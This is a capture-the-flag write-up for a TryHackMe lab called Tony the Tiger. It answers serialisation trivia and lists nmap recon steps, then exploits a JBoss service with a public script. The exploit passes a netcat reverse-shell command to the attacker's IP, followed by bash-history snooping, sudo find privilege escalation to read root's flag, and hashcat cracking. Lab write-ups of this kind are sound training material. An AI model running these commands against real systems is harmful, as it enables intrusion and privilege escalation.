---
description: https://tryhackme.com/room/tonythetiger
---

# Tony the Tiger

## :book: Support Material

### What is a great IRL example of an "Object"?

> lamp

### What is the acronym of a possible type of attack resulting from a "serialisation" attack?

> DoS

### What lower-level format does data within "Objects" get converted into?

> byte stream

## :map: Reconnaissance

### What service is running on port "8080"

```
nmap -sV -p8080 10.10.230.198
```

![](<../../.gitbook/assets/Screenshot from 2020-09-30 11-45-10.png>)

### What is the name of the front-end application running on "8080"?

```
nmap -p8080 --script http-title 10.10.230.198
```

![](<../../.gitbook/assets/Screenshot from 2020-09-30 11-47-15.png>)

## :flag\_black: Find Tony's Flag!

```bash
nmap 10.10.230.198
```

![](<../../.gitbook/assets/Screenshot from 2020-09-30 11-49-35.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-30 11-54-40.png>)

```
wget https://i.imgur.com/be2sOV9.jpg
strings be2sOV9.jpg
```

![](<../../.gitbook/assets/Screenshot from 2020-09-30 11-56-56.png>)

## :space\_invader: Exploit!

```
nc -nvlp 4444
```

```
unzip jboss.zip
cd jboss/
python exploit.py 10.10.230.198:8080 'nc -e /bin/sh 10.9.101.193 4444'
```

## :checkered\_flag: Find User JBoss' flag!

```
$ ls -lA /home
$ ls -lA /home/jboss
$ cat /home/jboss/note
$ cat /home/jboss/.bash_history
```

![](<../../.gitbook/assets/Screenshot from 2020-09-30 12-40-32.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-30 12-41-27.png>)

## Escalation!

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ su - jboss
$ sudo -l
$ sudo /usr/bin/find /root -type f -name root.txt -exec cat {} \;
```

![](<../../.gitbook/assets/Screenshot from 2020-09-30 12-52-31.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-30 12-53-51.png>)

```bash
echo -n 'QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y=' > md5.txt
hashcat -a 0 -m 0 md5.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-30 12-51-38.png>)

## :link: Support Material

{% embed url="https://www.digicentre.com.tw/industry_detail.php?id=37" %}
